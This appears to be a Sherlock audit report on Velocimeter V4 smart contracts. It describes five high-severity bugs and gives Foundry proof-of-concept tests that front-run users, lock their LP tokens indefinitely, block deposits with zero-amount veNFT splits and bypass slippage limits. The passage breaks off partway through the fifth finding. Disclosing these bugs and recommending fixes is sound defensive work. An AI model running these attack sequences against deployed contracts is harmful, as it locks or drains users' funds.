# Velocimeter

[Velocimeter V4](https://audits.sherlock.xyz/contests/442) is a ve33 dex with veLP, permissionless gauges, and an emission schedule that grows with demand. These new features are the focus of the contest

## Audit Findings Summary

| ID | Title | Severity |
|----|----------|----------|
| [H-1](#h-1-attacker-can-permanently-lock-users-tokens-by-calling-optiontokenv4exerciseLp-on-their-behalf) | Attacker can permanently lock users' tokens by calling OptionTokenV4::exerciseLp on their behalf | High |
| [H-2](#h-2-attacker-can-permanently-block-deposits-in-votingescrow-due-to-lack-of-0-amount-check-in-votingescrowsplit) | Attacker can permanently block deposits in VotingEscrow due to lack of 0 amount check in VotingEscrow::split | High |
| [H-3](#h-3-rewardsdistributorv2-incorrect-reward-calculation-due-to-caching-total-ve_supply) | RewardsDistributorV2 incorrect reward calculation due to caching total ve_supply | High |
| [H-4](#h-4-inadequate-slippage-protection-for-optiontokenv4exerciseve-and-optiontokenv4exerciseLp) | Inadequate slippage protection for OptionTokenV4::exerciseVe and OptionTokenV4::exerciseLp | High |
| [H-5](#h-5-pausing-and-unpausing-gauges-will-cause-the-gauge-to-lose-all-claimable-rewards) | Pausing and unpausing gauges will cause the gauge to lose all claimable rewards | High |
| [M-1](#m-1-first-liquidity-provider-can-dos-stable-pair-pools-by-exploiting-rounding-error) | First Liquidity Provider can DoS stable pair pools by exploiting rounding error | Medium |
---

## [H-1] Attacker can permanently lock users' tokens by calling OptionTokenV4::exerciseLp on their behalf

## Summary

Users can lock their LP tokens into gauges to incentivize votes, which can allow them to receive oTokens as rewards. Users can withdraw their tokens once their respective lock time has passed.

If users choose to deposit again, they have the ability to extend their lock time. The problem is that an attacker can deposit on a user's behalf via OptionTokenV4::exerciseLp and permanently extend their lock time, forever locking the innocent user's LP tokens and forbidding them from withdrawing.

## Vulnerability Detail

There are two ways for users to lock their LP tokens into gauges for a specific lock duration.

The first way is to directly call Gauge4::depositWithLock on the gauge. Only the account owner or the oToken contract can call this function.

GaugeV4.sol#L443-L459
```javascript
    function depositWithLock(address account, uint256 amount, uint256 _lockDuration) external lock {
        require(msg.sender == account || isOToken[msg.sender],"Not allowed to deposit with lock"); 
        _deposit(account, amount, 0);

        if(block.timestamp >= lockEnd[account]) { // if the current lock is expired relased the tokens from that lock before loking again
            delete lockEnd[account];
            delete balanceWithLock[account];
        }

        balanceWithLock[account] += amount;
        uint256 currentLockEnd = lockEnd[account];
        uint256 newLockEnd = block.timestamp + _lockDuration ;
        if (currentLockEnd > newLockEnd) {
            revert("The current lock end > new lock end");
        } 
        lockEnd[account] = newLockEnd;
    }
```
The second way is by utilizing their oTokens (options tokens) by exercising them via OptionTokenV4::exerciseLp to earn LP tokens at a discount which are immediately locked:

OptionTokenV4.sol#L700-L704
```javascript
    IGaugeV4(_gauge).depositWithLock(
        _recipient,
        lpAmount,
        getLockDurationForLpDiscount(_discount)
    );
However, the difference with these two methods is that OptionTokenV4::exerciseLp doesn't check if the specified recipient is the caller, allowing anyone to lock tokens on behalf of another user.

Let's take a closer look at Gauge4::depositWithLock:

    if(block.timestamp >= lockEnd[account]) { // if the current lock is expired relased the tokens from that lock before loking again
        delete lockEnd[account];
        delete balanceWithLock[account];
    }

    balanceWithLock[account] += amount;
    uint256 currentLockEnd = lockEnd[account];
    uint256 newLockEnd = block.timestamp + _lockDuration ; //@audit lock is extended
    if (currentLockEnd > newLockEnd) {
        revert("The current lock end > new lock end");
    } 
    lockEnd[account] = newLockEnd;
```

Consider a case where the user has already deposited to lock their tokens and they decide to deposit again.

The first if statement checks if the lock duration has passed. If true, then the lock mappings are reset and updated to a new duration for the new locked amount. The previously locked tokens can then be withdrawn via GaugeV4::withdrawToken:

GaugeV4.sol#L513-L530)
```javascript
    function withdrawToken(uint amount, uint tokenId) public lock {
        _updateRewardForAllTokens();

        uint256 totalBalance = balanceOf[msg.sender];
        uint256 lockedAmount = balanceWithLock[msg.sender];
        uint256 freeAmount = totalBalance - lockedAmount;
        // Update lock related mappings when withdraw amount greater than free amount
        if (amount > freeAmount) {
            // Check if lock has expired
            require(block.timestamp >= lockEnd[msg.sender], "The lock didn't expire");
            uint256 newLockedAmount = totalBalance - amount;
            if (newLockedAmount == 0) {
                delete lockEnd[msg.sender];
                delete balanceWithLock[msg.sender];
            } else {
                balanceWithLock[msg.sender] = newLockedAmount;
            }
        }
        ...
```

However, if the lock time has not passed, it is updated to the newLockEnd duration, which is block.timestamp + _lockDuration in the future. An attacker can exploit this the following way:

Alice locks 1e18 LP tokens for 1 week
Attacker backruns and calls OptionTokenV4::exerciseLp by specifying Alice's address as the recipient
Alice's lock period is now extended by 52 weeks
After one week, Alice attempts to withdraw but her call reverts unexpectedly.
In this case, Alice's tokens are locked for 52 weeks. After 51 weeks has passed, the attacker can repeat the call to extend for another 52 weeks, indefinitely locking her tokens. It's important to note that this can only be done by the attacker by locking on her behalf before her lock period ends, because that way it will extend her lock period rather than create a new lock period.

## Proof of Concept

Add the following to test/OptionTokenV4.t.sol and run forge test --mt testGaugeWithdrawBlocked -vv
```javascript
    function testGaugeWithdrawBlocked() public {
        vm.startPrank(address(owner)); // address of Alice
        FLOW.approve(address(oFlowV4), TOKEN_1);
        // mint Option token to owner 2
        oFlowV4.mint(address(owner2), TOKEN_1); // address of attacker
        washTrades();
        flowDaiPair.approve(address(gauge),TOKEN_1);

        uint256 lpBalanceBefore = flowDaiPair.balanceOf(address(owner));
        gauge.depositWithLock(address(owner), TOKEN_1, 7 * 86400); // Alice deposits for 1 week
        uint256 startLockDuration = 7 * 86400 / 86400 / 7;
        console.log("Number of weeks for Alice's lock duration: ", startLockDuration);
        vm.stopPrank();

      
        vm.startPrank(address(owner2)); // attacker backruns and deposits with lock on behalf of user
        DAI.approve(address(oFlowV4), TOKEN_100K);
        (uint256 paymentAmount, ) = oFlowV4.exerciseLp(TOKEN_1, TOKEN_1, address(owner),20,block.timestamp);
        vm.stopPrank();

        uint256 newLockDuration = oFlowV4.getLockDurationForLpDiscount(20) / 86400 / 7;

        console.log("Number of weeks Alice's lock duration is extended by the attacker: ", newLockDuration);

        vm.warp(block.timestamp + 7 * 86400 + 1); // more than 1 week has passed

        vm.startPrank(address(owner));
        vm.expectRevert("The lock didn't expire");
        gauge.withdraw(TOKEN_1);
        vm.stopPrank();
    }
```

Console Output
```text
Running 1 test for test/OptionTokenV4.t.sol:OptionTokenV4Test
[PASS] testGaugeWithdrawBlocked() (gas: 3446568)
Logs:
  Number of weeks for Alice's lock duration:  1
  Number of weeks Alice's lock duration is extended by the attacker:  52

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 16.74ms
```

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
We can see from this test that despite Alice's initial lock duration set to 1 week, she still wasn't able to withdraw after 1 week had passed due to her lock not expiring. This is because the attacker had extended it by 52 weeks.

## Impact

Loss of funds for users, permanently locked tokens, denial of service.

## Code Snippet

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/GaugeV4.sol#L443-L459

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/OptionTokenV4.sol#L700-L704

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/GaugeV4.sol#L513-L530

## Tool used

Manual Review

## Recommendation

GaugeV4::depositWithLock does not allow the caller to deposit on behalf of other users. Consider incorporating the same mechanism for OptionTokenV4::exerciseLp:
```javascript
    function exerciseLp(
        uint256 _amount,
        uint256 _maxPaymentAmount,
        address _recipient,
        uint256 _discount,
        uint256 _deadline
    ) external returns (uint256, uint256) {
+       require(_recipient == msg.sender);      
        if (block.timestamp > _deadline) revert OptionToken_PastDeadline();
        return _exerciseLp(_amount, _maxPaymentAmount, _recipient, _discount);
    }
```

## [H-2] Attacker can permanently block deposits in VotingEscrow due to lack of 0 amount check in VotingEscrow::split

## Summary

The VotingEscrow contract allows users to lock LP tokens for a maximum time of 52 weeks. In return, they are minted a veNFT that grants them the ability to vote on gauges for rewards, which is a core functionality of the protocol.

The issue is regarding VotingEscrow::split, which allows veNFT holders to split their NFTs. For example, if Bob locks 500e18 LP tokens and receives a veNFT of id = 1, he can call VotingEscrow::split to create a new veNFT with id = 2, that takes 250e18 LP tokens (or however many tokens he specifies) from the veNFT of id = 1. Bob will now own two veNFT's (id=1, id=2), each holding 250e18 LP tokens.

The problem is that VotingEscrow::split does not verify that the split amount is greater than 0. A user can specify 0 amount and mint as many veNFTs without locking any tokens for it.

An attacker can exploit this by front-running an innocent user's call to deposit and delegating the split veNFTs to the user until it reaches MAX_DELEGATES, permanently blocking deposits for the innocent user.

## Vulnerability Detail

Users can deposit and lock their tokens via VotingEscrow::create_lock or VotingEscrow::create_lock_for. Note that any other deposit functionality within the contract is to increase existing locks.

VotingEscrow.sol#L839-L852
```javascript
    function _create_lock(uint _value, uint _lock_duration, address _to) internal returns (uint) {
        uint unlock_time = (block.timestamp + _lock_duration) / WEEK * WEEK; // Locktime is rounded down to weeks

@>      require(_value > 0); // dev: need non-zero value
        require(unlock_time > block.timestamp, 'Can only lock until time in the future');
        require(unlock_time <= block.timestamp + MAXTIME, 'Voting lock can be 52 weeks max');

        ++tokenId;
        uint _tokenId = tokenId;
@>      _mint(_to, _tokenId);

        _deposit_for(_tokenId, _value, unlock_time, locked[_tokenId], DepositType.CREATE_LOCK_TYPE);
        return _tokenId;
    }
```

Note that the user must lock amount > 0. The user is then minted a veNFT which can be used to vote on gauges.

The _mint function calls _moveTokenDelegates, which has the following require check:

VotingEscrow.sol#L1398-L1401
```javascript
    require(
        dstRepOld.length + 1 <= MAX_DELEGATES,
        "dstRep would have too many tokenIds"
    );
```

This is to ensure that users can only have MAX_DELEGATES = 1024, which is for gas efficiency. If the user's delegates are already at 1024, they can no longer lock any tokens.

VotingEscrow::split mints a new veNFT for veNFT holders that decide to allocate some of the locked tokens to a new veNFT.

VotingEscrow.sol#L1217-L1244
```javascript
    function split(uint _tokenId,uint amount) external {
        
        // check permission and vote
        require(attachments[_tokenId] == 0 && !voted[_tokenId], "attached");
        require(_isApprovedOrOwner(msg.sender, _tokenId));
        require(!blockedSplit[_tokenId],"split blocked");

        // save old data and totalWeight
        address _to = idToOwner[_tokenId];
        LockedBalance memory _locked = locked[_tokenId];
        uint end = _locked.end;
        uint value = uint(int256(_locked.amount));
        require(value > amount,"amount > value");

        // save end
        uint unlock_time = end;
        require(unlock_time > block.timestamp, 'Can only lock until time in the future');
        require(unlock_time <= block.timestamp + MAXTIME, 'Voting lock can be 52 weeks max');

        // remove old data
        _remove_from(_tokenId, amount, unlock_time, _locked);
        
        // mint 
        ++tokenId;
        uint _newTokenId = tokenId;
        _mint(_to, _newTokenId);
        _deposit_for(_newTokenId, amount, unlock_time, locked[_newTokenId], DepositType.SPLIT_TYPE);
    }
```

However, it lacks any checks to verify that amount > 0. Users can call this function with 0 amount and mint as many veNFTs without locking any LP tokens.

An attacker can exploit this via the following:

Alice calls VotingEscrow::create_lock to lock her tokens for a veNFT.
Attacker front-runs transaction and calls split to delegate 0 amount locked veNFT to Alice until it reaches MAX_DELEGATES.
Alice's call to VotingEscrow::create_lock will permanently revert since she has token delegates = MAX_DELEGATES.
Note that she will also have essentially 0 voting power because her locked amounts are of 0 amount.
Alice will never be able to deposit and lock her tokens in VotingEscrow for a veNFT, and thus will not be able to vote on gauges.

## Proof of Concept

Add the following to test/VotingEscrow.t.sol and run forge test --mt testDepositsBlocked
```javascript
    function testDepositsBlocked() public {
        address alice = vm.addr(1);
        address attacker = vm.addr(2);
        uint256 maxtime = 52 * 7 * 24 * 3600; // 52 weeks
        
        // get LP tokens
        FLOW.mint(address(attacker), TOKEN_1M);
        DAI.mint(address(attacker), TOKEN_1M);
        FLOW.mint(address(alice), TOKEN_1M);
        DAI.mint(address(alice), TOKEN_1M);

        vm.startPrank(address(attacker));
        FLOW.approve(address(router), TOKEN_1M);
        DAI.approve(address(router), TOKEN_1M);
        router.addLiquidity(address(FLOW), address(DAI), false, TOKEN_1M, TOKEN_1M, 0, 0, address(attacker), block.timestamp);
        vm.stopPrank();

        vm.startPrank(address(alice));
        FLOW.approve(address(router), TOKEN_1M);
        DAI.approve(address(router), TOKEN_1M);
        router.addLiquidity(address(FLOW), address(DAI), false, TOKEN_1M, TOKEN_1M, 0, 0, address(alice), block.timestamp);
        vm.stopPrank();

        // attacker front-runs alice's attempt to lock tokens and delegates MAX_DELEGATES to her
        vm.startPrank(address(attacker));
        flowDaiPair.approve(address(escrow), type(uint256).max);
        uint tokenId = escrow.create_lock(1, maxtime);
        for(uint256 i = 0; i < escrow.MAX_DELEGATES() - 1; i++) {
            escrow.split(tokenId, 0); // split 0 amount
            escrow.delegate(address(alice));
        }
        vm.stopPrank();

        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 2);

        // alice attempts to lock but reverts
        vm.startPrank(address(alice));
        flowDaiPair.approve(address(escrow), type(uint256).max);
        vm.expectRevert("dstRep would have too many tokenIds");
        escrow.create_lock(TOKEN_1, maxtime);
        vm.stopPrank();
    }
```

## Impact

Permanent Denial of Service, deposits blocked. Users cannot mint veNFTs and vote for gauges, breaking core functionality and incentives of the protocol.

## Code Snippet

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/VotingEscrow.sol#L839-L852

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/VotingEscrow.sol#L1398-L1401

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/VotingEscrow.sol#L1217-L1244

## Tool used

Manual Review

## Recommendation

Ensure that users can't split their veNFTs with 0 amount:
```javascript
    function split(uint _tokenId,uint amount) external {
        
        // check permission and vote
        require(attachments[_tokenId] == 0 && !voted[_tokenId], "attached");
        require(_isApprovedOrOwner(msg.sender, _tokenId));
        require(!blockedSplit[_tokenId],"split blocked");
+       require(amount > 0, "Cannot split with 0 amount");

        // save old data and totalWeight
        address _to = idToOwner[_tokenId];
        LockedBalance memory _locked = locked[_tokenId];
        uint end = _locked.end;
        uint value = uint(int256(_locked.amount));
        require(value > amount,"amount > value");

        // save end
        uint unlock_time = end;
        require(unlock_time > block.timestamp, 'Can only lock until time in the future');
        require(unlock_time <= block.timestamp + MAXTIME, 'Voting lock can be 52 weeks max');

        // remove old data
        _remove_from(_tokenId, amount, unlock_time, _locked);
        
        // mint 
        ++tokenId;
        uint _newTokenId = tokenId;
        _mint(_to, _newTokenId);
        _deposit_for(_newTokenId, amount, unlock_time, locked[_newTokenId], DepositType.SPLIT_TYPE);
    }
```

## [H-3] RewardsDistributorV2 incorrect reward calculation due to caching total ve_supply

## Summary

Users can lock their tokens in VotingEscrow to receive a veNFT, which allows them to receive rewards via RewardsDistributorV2.

RewardsDistributorV2 caches the total ve_supply, which is the total balance locked in Voting Escrow at a specific time (epochs). This is used to determine reward calculation.

However, the total supply can be cached at the beginning of an epoch, and not updated again until after the epoch ends.

Therefore the calculation of claimable rewards epoch rewards * user supply / total supply will be incorrect and will give users extra rewards, causing some users to steal rewards for others and possible DoS for other users due to insufficient rewards.

This is a known issue with Velodrome V1 forks that hasn't been fixed in Velocimeter V4.

## Vulnerability Detail

The total supply of locked tokens in Voting Escrow is cached in RewardsDistributorV2 so that past values of total supply can be fetched easily:

RewardsDistributorV2.sol#L46

uint[1000000000000000] public ve_supply;
Anyone can cache the current total supply, as long as the time_cursor does not point to a new week:

RewardsDistributorV2.sol#L142-L167
```javascript
    function _checkpoint_total_supply() internal {
        address ve = voting_escrow;
@>      uint t = time_cursor;
@>      uint rounded_timestamp = block.timestamp / WEEK * WEEK;
        IVotingEscrow(ve).checkpoint();

        for (uint i = 0; i < 20; i++) {
@>          if (t > rounded_timestamp) { //@audit-info next epoch, so we break
                break;
            } else {
                uint epoch = _find_timestamp_epoch(ve, t);
                IVotingEscrow.Point memory pt = IVotingEscrow(ve).point_history(epoch);
                int128 dt = 0;
                if (t > pt.ts) {
                    dt = int128(int256(t - pt.ts));
                }
                ve_supply[t] = Math.max(uint(int256(pt.bias - pt.slope * dt)), 0);
            }
            t += WEEK;
        }
@>      time_cursor = t;
    }

    function checkpoint_total_supply() external {
        _checkpoint_total_supply();
    }
```
Notice what's happening here. rounded_timestamp calculates the beginning of the current week (Thursday), and note that each epoch in the Velocimeter protocol is 1 week long (begins every Thursday).

If the time_cursor points to the next epoch (next week), then the loop breaks since that epoch has not yet started. Once that epoch starts, users can proceed to call checkpoint_total_supply to update the total supply.

However, this is an issue, as users can call this function as soon as the epoch starts, which will update the ve_supply of the current epoch to be the same as the last epoch (which is the current total supply). Since t is updated to the next epoch via t += WEEK, the loop will break everytime checkpoint_total_supply is called again because t > rounded_timestamp (points to the next epoch). Therefore, the total supply (ve_supply) cannot be updated for the rest of the epoch, so when rewards are finally distributed at the end of the epoch, it will not correctly reflect the total supply of the epoch.

Rewards are distributed via the following calculation:

RewardsDistributorV2.sol#L210-L212
```javascript
    if (balance_of != 0) {
        to_distribute += balance_of * tokens_per_week[week_cursor] / ve_supply[week_cursor];
    }
```
Since ve_supply is lower than reality, users will receive extra rewards, causing others to lose rewards and possible DoS of claim() due to insufficient rewards.

Consider the following example:

Total supply of locked tokens is 100.
As soon as a new epoch starts, user calls checkpoint_total_supply to update ve_supply of this epoch to 100 tokens.
User proceeds to lock 200 tokens.
Now, any call to checkpoint_total_supply will not update the ve_supply to 300 tokens, since time_cursor points to the next week, so the loop instantly breaks.
Fast forward to when rewards are distributed, and the user proceeds to earn 2x rewards than what they should have received (since ve_supply is 100 instead of the actual total supply at that epoch).


## Impact

Rewards stolen, possible DoS due to insufficient rewards for some users.

## Code Snippet

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/RewardsDistributorV2.sol#L46

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/RewardsDistributorV2.sol#L142-L167

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/RewardsDistributorV2.sol#L210-L212

## Tool used

Manual Review

## Recommendation

Consider removing the checkpoint_total_supply functionality and fetch the balance of locked tokens directly from VotingEscrow 1 second before the epoch flip, which is how Velodrome Finance fixed this issue. This way, the total balance will correctly reflect the balance of locked tokens of the respective epoch.

## [H-4] Inadequate slippage protection for OptionTokenV4::exerciseVe and OptionTokenV4::exerciseLp

## Summary

OptionTokenV4::exerciseVe and OptionTokenV4::exerciseLp functions allow users to burn their option tokens and transfer paymentToken (i.e, DAI) which will be used for fees, adding liquidity to the respective liquidity pool (i.e, FLOW/DAI) for lp tokens, and for sending rewards to the gauge. The sender must transfer paymentAmount + paymentAmountToAddLiquidity amount of paymentToken.

paymentAmount is used for treasury fees + gauge reward and paymentAmountToAddLiquidity is used for adding liquidity for lp tokens.

The problem is that the slippage protection for OptionTokenV4::exerciseVe and OptionTokenV4::exerciseLp only checks if paymentAmount > _maxPaymentAmount. There are no slippage checks for paymentAmountToAddLiquidity. This is erroneous, as the current pool reserves are used to calculate paymentAmountToAddLiquidity, which can change while the transaction is in the mempool. Users may have to pay more than expected, causing a loss of funds.

## Vulnerability Detail

OptionTokenV4.sol#L593-L621)
```javascript
    function _exerciseVe(
        uint256 _amount,
@>      uint256 _maxPaymentAmount,
        uint256 _discount,
        address _recipient
    ) internal returns (uint256 paymentAmount, uint256 nftId,uint256 lpAmount) {
        if (isPaused) revert OptionToken_Paused();
        if (isExerciseVePaused) revert OptionToken_Paused();

        if (_discount > minLPDiscount || _discount < maxLPDiscount)
            revert OptionToken_InvalidDiscount();
            
        // burn callers tokens
        _burn(msg.sender, _amount);
@>      (uint256 paymentAmount,uint256 paymentAmountToAddLiquidity) =  getPaymentTokenAmountForExerciseLp(_amount,_discount); // TODO decide if we want to have the curve or just always maxlock
@>      if (paymentAmount > _maxPaymentAmount) //@audit-issue inadequate slippage, as the user must pay paymentAmount + paymentAmountToAddLiquidity
            revert OptionToken_SlippageTooHigh();
          
        // Take team fee
@>      uint256 paymentGaugeRewardAmount = _discount == 0 ? 0 : _takeFees( //@audit take fees (which caller must pay)
            paymentToken,
            paymentAmount
        );
        _safeTransferFrom(
            paymentToken,
            msg.sender,
            address(this),
@>          paymentGaugeRewardAmount + paymentAmountToAddLiquidity
        );
```
Users can specify _maxPaymentAmount for the slippage check if (paymentAmount > _maxPaymentAmount).

Fees are taken from the amount via _takeFees, which directly transfers the fee amount the user must pay via safeTransferFrom. The fees are deducted from paymentAmount and paymentGaugeRewardAmount is returned.

The protocol proceeds to transfer paymentGaugeRewardAmount + paymentAmountToAddLiquidity from the caller. We can see now that the full amount of paymentToken the user must pay is paymentAmount + paymentAmountToAddLiquidity.

Therefore the slippage check should be if paymentAmount + paymentAmountToAddLiquidity exceeds the user specified max payment amount.

In addition, the paymentAmountToAddLiquidity amount is calculated based off the current reserves of the pool:

OptionTokenV4.sol#L350-L356
```javascript
    function getPaymentTokenAmountForExerciseLp(uint256 _amount,uint256 _discount) public view returns (uint256 paymentAmount, uint256 paymentAmountToAddLiquidity)
    {
       
        paymentAmount = _discount == 0 ? 0 : getLpDiscountedPrice(_amount, _discount);
@>      (uint256 underlyingReserve, uint256 paymentReserve) = IRouter(router).getReserves(underlyingToken, paymentToken, false);
        paymentAmountToAddLiquidity = (_amount * paymentReserve) / underlyingReserve;
    }
```
This can change prior to function execution (i.e, front-running, large amount of pool swaps, etc), which may cause the user to pay more paymentAmountToAddLiquidity than expected, causing a loss of funds.

## Proof of Concept

Add the following to test/OptionTokenV4.t.sol and run forge test --mt testInsufficientSlippage -vv
```javascript
    function testInsufficientSlippage() public {
        vm.startPrank(address(owner));
        FLOW.approve(address(oFlowV4), TOKEN_1);
        // mint Option token to owner 2
        oFlowV4.mint(address(owner2), TOKEN_1);

        washTrades();
        vm.stopPrank();

        uint256 bobOflowBalanceBefore = oFlowV4.balanceOf(address(owner2));
        uint256 bobDaiBalanceBefore = DAI.balanceOf(address(owner2));
        uint256 maxAmount = 1e10;

        console.log("Bob's oFLOW balance before exercising options: ", bobOflowBalanceBefore);
        console.log("Bob's DAI balance before exercising options: ", bobDaiBalanceBefore);
        console.log("Bob's maxAmount of DAI to spend: ", maxAmount);

        vm.startPrank(address(owner2));
        DAI.approve(address(oFlowV4), TOKEN_100K);
 
        (, uint256 nftId, ) = oFlowV4.exerciseVe(
            1e10,
            maxAmount,
            address(owner2),
            80,
            block.timestamp
        );
        vm.stopPrank();

        uint256 bobOflowBalanceAfter = oFlowV4.balanceOf(address(owner2));
        uint256 bobDaiBalanceAfter = DAI.balanceOf(address(owner2));
        uint256 bobDaiBalanceSpent = bobDaiBalanceBefore - bobDaiBalanceAfter;

        console.log("Bob's oFLOW balance after exercising options: ", bobOflowBalanceAfter);
        console.log("Bob's DAI balance after exercising options: ", bobDaiBalanceAfter);
        console.log("Amount of DAI Bob spent: ", bobDaiBalanceSpent);
        assert(bobDaiBalanceSpent > maxAmount);
    }
```
Console Output
```text
Running 1 test for test/OptionTokenV4.t.sol:OptionTokenV4Test
[PASS] testInsufficientSlippage() (gas: 3511876)
Logs:
  Bob's oFLOW balance before exercising options:  1000000000000000000
  Bob's DAI balance before exercising options:  1000000000000000000000000000000
  Bob's maxAmount of DAI to spend:  10000000000
  Bob's oFLOW balance after exercising options:  999999990000000000
  Bob's DAI balance after exercising options:  999999999999999999981999999970
  Amount of DAI Bob spent:  18000000030

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 17.34ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

We can see from this PoC that the amount of paymentToken (DAI) Bob paid far exceeded the max amount of paymentToken Bob specified to spend.

## Impact

Loss of funds for users due to inadequate slippage protection.

## Code Snippet

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/OptionTokenV4.sol#L593-L621

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/OptionTokenV4.sol#L350-L356

## Tool used

Manual Review

## Recommendation

Consider making the following changes to OptionTokenV4::exerciseVe and OptionTokenV4::exerciseLp
```diff
-   if (paymentAmount > _maxPaymentAmount)
+    if (paymentAmount + paymentAmountToAddLiquidity > _maxPaymentAmount)
        revert OptionToken_SlippageTooHigh();
```

## [H-5] Pausing and unpausing gauges will cause the gauge to lose all claimable rewards

## Summary

Gauges earn weekly emissions, which is distributed based off weights of a pool that corresponds to the amount of votes to the pool by veNFT holders. Voters earn these rewards by calling getReward on the gauge.

LPs of the pool incentivize votes by locking their LP tokens in the gauge, setting external bribes, etc. The more funds provided by LPs to incentivize votes, the more votes they are likely to get.

The Voter contract allows for gauges to be created, killed, and paused/unpaused. Currently, only the emergency council can pause/unpause gauges.

However, there is a problem with pausing/unpausing gauges that will cause all claimable rewards for that epoch to be lost, causing loss of funds for LPs and rewards lost for veNFT holders who voted on the pool of the gauge.

## Vulnerability Detail

Let's look at how rewards are distributed to gauges.

Voter.sol#L485-L495
```javascript
    function notifyRewardAmount(uint amount) external {
        require(msg.sender == minter,"not a minter");
        activeGaugeNumber = 0;
        currentEpochRewardAmount = amount;
        _safeTransferFrom(base, msg.sender, address(this), amount); // transfer the distro in
        uint256 _ratio = amount * 1e18 / totalWeight; // 1e18 adjustment is removed during claim
        if (_ratio > 0) {
            index += _ratio;
        }
        emit NotifyReward(msg.sender, base, amount);
    }
```
Every week this function is called by the Minter contract to send weekly rewards to the Voter contract, which go to gauges.

The following function will update the rewards for the specific gauge, by incrementing claimable mapping for that gauge.

Voter.sol#L513-L534
```javascript
    function updateGauge(address _gauge) external {
        _updateFor(_gauge);
    }

    function _updateFor(address _gauge) internal {
        address _pool = poolForGauge[_gauge];
        uint256 _supplied = weights[_pool];
        if (_supplied > 0) {
            uint _supplyIndex = supplyIndex[_gauge];
            uint _index = index; // get global index0 for accumulated distro
            supplyIndex[_gauge] = _index; // update _gauge current position to global position
            uint _delta = _index - _supplyIndex; // see if there is any difference that need to be accrued
            if (_delta > 0) {
                uint _share = uint(_supplied) * _delta / 1e18; // add accrued difference for each supplied token
                if (isAlive[_gauge]) {
@>                  claimable[_gauge] += _share;
                }
            }
        } else {
            supplyIndex[_gauge] = index; // new users are set to the default global state
        }
    }
```
Finally, the following will actually send the claimable amount of rewards to the gauge:

Voter.sol#L549-L562
```javasscript
    function distribute(address _gauge) public lock {
        IMinter(minter).update_period();
        _updateFor(_gauge); // should set claimable to 0 if killed
@>      uint _claimable = claimable[_gauge];
        if (_claimable > IGauge(_gauge).left(base) && _claimable / DURATION > 0) {
            claimable[_gauge] = 0;
            if((_claimable * 1e18) / currentEpochRewardAmount > minShareForActiveGauge) {
                activeGaugeNumber += 1;
            }

@>          IGauge(_gauge).notifyRewardAmount(base, _claimable);
            emit DistributeReward(msg.sender, _gauge, _claimable);
        }
    }
```
Let's look at what happens when gauges are paused by the emergency council:

Voter.sol#L380-L405
```javascript
    function pauseGauge(address _gauge) external {
        if (msg.sender != emergencyCouncil) {
            require(
                IGaugePlugin(gaugePlugin).checkGaugePauseAllowance(msg.sender, _gauge)
            , "Pause gauge not allowed");
        }
        require(isAlive[_gauge], "gauge already dead");
        isAlive[_gauge] = false;
@>      claimable[_gauge] = 0; //@audit-issue resets claimable rewards to 0
        address _pair = IGauge(_gauge).stake(); // TODO: add test cases
        try IPair(_pair).setHasGauge(false) {} catch {}
        emit GaugePaused(_gauge);
    }

    function restartGauge(address _gauge) external {
        if (msg.sender != emergencyCouncil) {
            require(
                IGaugePlugin(gaugePlugin).checkGaugeRestartAllowance(msg.sender, _gauge)
            , "Restart gauge not allowed");
        }
        require(!isAlive[_gauge], "gauge already alive");
        isAlive[_gauge] = true;
        address _pair = IGauge(_gauge).stake(); // TODO: add test cases
        try IPair(_pair).setHasGauge(true) {} catch {}
        emit GaugeRestarted(_gauge);
    }
```
We can see here that claimable amount is set to 0. This is erroneous as this will cause the gauge to lose all rewards which cannot be recovered after unpausing. veNFT voters can only vote for one gauge per epoch, which will cause the vote to be wasted, since they will not receive any rewards. The LPs will also not be receiving rewards and will lose funds from the amount invested into incentivizing voters due to lost rewards.

The correct solution would be to distribute any claimable rewards to the gauge prior to pausing it, allowing voters and LP to receive their rewards.

## Proof of Concept

For this test, there are two test functions. The first test displays the problem, the second test displays the solution.

Add the following to test/Minter.t.sol and run: forge test --mt testPauseRewardsLost -vv
```javascript
    function testPauseRewardsLost() public {
        initializeVotingEscrow();

        FLOW.approve(address(router), TOKEN_1);
        FRAX.approve(address(router), TOKEN_1);
        router.addLiquidity(address(FRAX), address(FLOW), false, TOKEN_1, TOKEN_1, 0, 0, address(owner), block.timestamp);
        address pair1 = router.pairFor(address(FRAX), address(FLOW), false);
        address pair2 = router.pairFor(address(DAI), address(FLOW), false);

        voter.createGauge(pair2, 0);
        address gauge = voter.gauges(pair2);
      
        address[] memory pools = new address[](2);
        pools[0] = pair1;
        pools[1] = pair2;
        uint256[] memory weights = new uint256[](2);
        weights[0] = 9899;
        weights[1] = 101;

        _elapseOneWeek();

        voter.vote(1, pools, weights);
        minter.update_period(); // give rewards to Voter contract
        voter.updateGauge(address(gauge)); // update rewards for gauge

        // expect distribution
        assertGt(voter.claimable(address(gauge)), 0); // verify there are claimable rewards
        console.log("Claimable rewards before pausing: ", voter.claimable(address(gauge)));
        console.log("Gauge balance before pause: ", FLOW.balanceOf(gauge));

        _elapseOneWeek();

        voter.pauseGauge(address(gauge));
        vm.warp(block.timestamp + 1 days); // admin decides to unpause next day
        voter.restartGauge(address(gauge));

        assertEq(voter.claimable(address(gauge)), 0); 
        console.log("Claimable rewards after unpausing next day: ", voter.claimable(address(gauge)));
        console.log("Gauge balance after unpause: ", FLOW.balanceOf(gauge));
    }
```

Add the following to test/Minter.t.sol and run: forge test --mt testPauseDistributeRewards -vv
```javascript
